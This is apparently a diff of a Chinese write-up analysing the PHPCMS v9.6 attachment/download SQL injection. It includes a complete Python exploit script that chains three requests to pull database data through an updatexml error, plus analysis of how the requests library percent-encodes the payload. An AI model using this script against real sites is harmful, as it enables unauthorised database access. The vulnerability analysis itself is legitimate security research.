@@ -65,29 +65,29 @@ import sys
 import re
 
 def WAP_SQL(url):
-   # step1
-   url_one = url + '/index.php?m=wap&c=index&siteid=1'
-   step1 = requests.get(url_one)
-   userid_flash = step1.headers['Set-Cookie'].split('=')[1]
+   # step1
+   url_one = url + '/index.php?m=wap&c=index&siteid=1'
+   step1 = requests.get(url_one)
+   userid_flash = step1.headers['Set-Cookie'].split('=')[1]
 
-   # step2
-   payload = '%*27 and updatexml(1,concat(1,(user())),1)%23&modelid=1&catid=1&m=1&f=Tao'
-   url_two = url + r"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id={}".format(requests.utils.quote(payload))# 执行SQL语句，此处可修改
-   step2 = requests.post(url_two, data={'userid_flash': userid_flash})
-   for cookie in step2.cookies:
-       if '_att_json' in cookie.name:
-           att_json = cookie.value
+   # step2
+   payload = '%*27 and updatexml(1,concat(1,(user())),1)%23&modelid=1&catid=1&m=1&f=Tao'
+   url_two = url + r"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id={}".format(requests.utils.quote(payload))# 执行SQL语句，此处可修改
+   step2 = requests.post(url_two, data={'userid_flash': userid_flash})
+   for cookie in step2.cookies:
+       if '_att_json' in cookie.name:
+           att_json = cookie.value
 
-   # step3
-   url_three = url + '/index.php?m=content&c=down&a_k={}'.format(att_json)
-   step3 = requests.get(url_three)
-   res = re.findall(r"MySQL Error : </b>XPATH syntax error: '(.*?)'",step3.text)
-   return res
+   # step3
+   url_three = url + '/index.php?m=content&c=down&a_k={}'.format(att_json)
+   step3 = requests.get(url_three)
+   res = re.findall(r"MySQL Error : </b>XPATH syntax error: '(.*?)'",step3.text)
+   return res
 
 if __name__ == '__main__':
-   url = sys.argv[1]
-   result_sql = WAP_SQL(url)
-   print(result_sql)
+   url = sys.argv[1]
+   result_sql = WAP_SQL(url)
+   print(result_sql)
 ```
 
 执行效果如下：
@@ -135,7 +135,7 @@ if __name__ == '__main__':
 上图可知，执行的 SQL 语句如下：
 
 ```
-SELECT * FROM `phpcmsv96`.`v9_news_data` WHERE  `id` = '' and updatexml(1,concat(1,(user())),1)#' LIMIT 1
+SELECT * FROM `phpcmsv96`.`v9_news_data` WHERE  `id` = '' and updatexml(1,concat(1,(user())),1)#' LIMIT 1
 ```
 
 我们将语句放到数据库执行一下。
@@ -321,26 +321,26 @@ url_two = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&sr
 
 PERCENT_RE = re.compile(r"%[a-fA-F0-9]{2}")# !!!
 .....
-   component, percent_encodings = PERCENT_RE.subn(
-       lambda match: match.group(0).upper(), component
-  )# !!!
+   component, percent_encodings = PERCENT_RE.subn(
+       lambda match: match.group(0).upper(), component
+  )# !!!
 
-   uri_bytes = component.encode("utf-8", "surrogatepass")
-   is_percent_encoded = percent_encodings == uri_bytes.count(b"%")# !!!
-   encoded_component = bytearray()
+   uri_bytes = component.encode("utf-8", "surrogatepass")
+   is_percent_encoded = percent_encodings == uri_bytes.count(b"%")# !!!
+   encoded_component = bytearray()
 
-   for i in range(0, len(uri_bytes)):
-       # Will return a single character bytestring on both Python 2 & 3
-       byte = uri_bytes[i : i + 1]
-       byte_ord = ord(byte)
-       if (is_percent_encoded and byte == b"%") or (# !!!
-           byte_ord < 128 and byte.decode() in allowed_chars
-      ):
-           encoded_component += byte
-           continue
-       encoded_component.extend(b"%" + (hex(byte_ord)[2:].encode().zfill(2).upper()))
+   for i in range(0, len(uri_bytes)):
+       # Will return a single character bytestring on both Python 2 & 3
+       byte = uri_bytes[i : i + 1]
+       byte_ord = ord(byte)
+       if (is_percent_encoded and byte == b"%") or (# !!!
+           byte_ord < 128 and byte.decode() in allowed_chars
+      ):
+           encoded_component += byte
+           continue
+       encoded_component.extend(b"%" + (hex(byte_ord)[2:].encode().zfill(2).upper()))
 
-   return encoded_component.decode(encoding)
+   return encoded_component.decode(encoding)
 ```
 
 看到这里，你应该知道怎么回事了吧，如果你还不知道，也没关系。我们通过对比观察现象来说明问题：
